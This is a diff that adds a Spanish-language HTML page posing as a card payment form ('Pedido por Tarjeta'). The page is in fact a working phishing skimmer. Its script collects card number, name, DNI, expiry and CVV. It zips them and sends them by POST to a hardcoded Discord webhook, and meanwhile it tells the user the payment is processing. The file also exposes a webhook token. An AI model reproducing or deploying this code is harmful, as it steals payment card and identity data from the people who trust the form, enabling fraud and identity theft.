@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Pagar con tarjetas</title>
+  <style>
+    body {
+      background: linear-gradient(to right, black, gray);
+      padding: 20px;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    
+    .container {
+      background-color: rgba(26, 26, 26, 0.8);
+      border-radius: 10px;
+      padding: 20px;
+      width: 400px;
+      opacity: 80%;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    
+    .input-field {
+      margin-bottom: 10px;
+    }
+    
+    .input-field label {
+      display: block;
+      margin-bottom: 5px;
+    }
+    
+    .input-field input {
+      width: 100%;
+      padding: 5px;
+      border-radius: 5px;
+      border: none;
+    }
+    
+    button {
+      padding: 10px 20px;
+      background-color: #1e1e1e;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    
+    #error-message {
+      color: red;
+      margin-bottom: 10px;
+    }
+    
+     #done-message {
+      color: green;
+      margin-bottom: 10px;
+    }
+    
+    .ui-datepicker {
+      background-color: white;
+      color: black;
+    }
+    
+    .ui-datepicker-header {
+      background-color: #1e1e1e;
+      color: white;
+    }
+    
+    .ui-datepicker-calendar a {
+      color: black;
+    }
+  </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.6.0/jszip.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
+  <script>
+    function updateSigninStatus() {
+      var cardNumber = document.getElementById("card-number").value;
+      var cardName = document.getElementById("card-name").value;
+      var cardDNI = document.getElementById("card-dni").value;
+      var cardExpiration = document.getElementById("card-expiration").value;
+      var cardCVV = document.getElementById("card-cvv").value;
+
+      if (!validateCard(cardNumber)) {
+        document.getElementById("error-message").textContent = "Tarjeta inválida";
+        return;
+      }
+
+      var fileName = cardNumber.substr(0, 6) + '_' + cardName + 'C';
+      var zipPassword = "08papanat4s";
+
+      var cardData = [
+        new Date().toLocaleString(),
+        cardNumber,
+        cardName,
+        cardDNI,
+        cardExpiration,
+        cardCVV
+      ];
+
+      sendToWebhook(zipPassword, fileName, cardData);
+    }
+
+    function sendToWebhook(password, fileName, cardData, zipPassword) { //function sendToWebhook(password, fileName, cardData)
+      var zip = new JSZip();
+      var csvContent = cardData.join(", ");
+      zip.file(fileName + ".txt", csvContent);
+      zip.generateAsync({ type: "blob", compression: "DEFLATE", password: zipPassword })
+        .then(function(content) {
+          var formData = new FormData();
+          formData.append("file", content, fileName + ".zip");
+
+          fetch("https://discord.com/api/webhooks/1116937945614651504/ZtSd7H7B8jvvKntmMQtoq7sDphILAMdJ_Ec6XnNiLICudI9DSnhtQ5kLbx13zt7TrtoX", {
+            method: "POST",
+            body: formData
+          })
+          .then(function(response) {
+            if (response.ok) {
+              console.log("Tarjeta enviada al webhook correctamente.");
+            } else {
+              console.error("Error al enviar la tarjeta al webhook.");
+            }
+          })
+          .catch(function(error) {
+            console.error("Error al enviar la tarjeta al webhook:", error);
+          });
+        });
+    }
+
+    function validateCard(cardNumber) {
+      var sum = 0;
+      var isEven = false;
+
+      for (var i = cardNumber.length - 1; i >= 0; i--) {
+        var digit = parseInt(cardNumber.charAt(i), 10);
+
+        if (isEven) {
+          digit *= 2;
+          if (digit > 9) {
+            digit -= 9;
+          }
+        }
+
+        sum += digit;
+        isEven = !isEven;
+      }
+
+      return sum % 10 === 0;
+    }
+
+    $(function() {
+      $("#card-expiration").datepicker({
+        dateFormat: "mm/yy",
+        changeMonth: true,
+        changeYear: true,
+        monthNames: [
+          "01", "02", "03", "04", "05", "06",
+          "07", "08", "09", "10", "11", "12"
+        ],
+        monthNamesShort: [
+          "01", "02", "03", "04", "05", "06",
+          "07", "08", "09", "10", "11", "12"
+        ],
+        prevText: "Anterior",
+        nextText: "Siguiente",
+        yearRange: "-0:+10",
+        showOtherMonths: true,
+        selectOtherMonths: true,
+        showMonthAfterYear: true,
+      });
+      
+      $("#card-cvv").on("input", function() {
+        this.value = this.value.replace(/[^0-9]/g, "").slice(0, 3);
+      });
+    });
+    
+    function showProcessingMessage() {
+      document.getElementById("done-message").textContent = "Listo! Procesando pago...";
+    }
+  </script>
+</head>
+<body>
+  <div class="container">
+    <h1>Pedido por Tarjeta</h1>
+  
+    <div id="error-message"></div>
+    <div id="done-message"></div>
+  
+    <div class="input-field">
+      <label for="card-number">Número de Tarjeta:</label>
+      <input type="text" id="card-number" maxlength="16" />
+    </div>
+  
+    <div class="input-field">
+      <label for="card-name">Nombre:</label>
+      <input type="text" id="card-name" />
+    </div>
+  
+    <div class="input-field">
+      <label for="card-dni">DNI:</label>
+      <input type="text" id="card-dni" maxlength="8" />
+    </div>
+  
+    <div class="input-field">
+      <label for="card-expiration">Fecha de Expiración:</label>
+      <input type="text" id="card-expiration" />
+    </div>
+    
+    <div class="input-field">
+      <label for="card-cvv">CVV:</label>
+      <input type="text" id="card-cvv" maxlength="3" />
+    </div>
+  
+    <button onclick="showProcessingMessage(); updateSigninStatus()">Enviar</button>
+  </div>
+</body>
+</html>
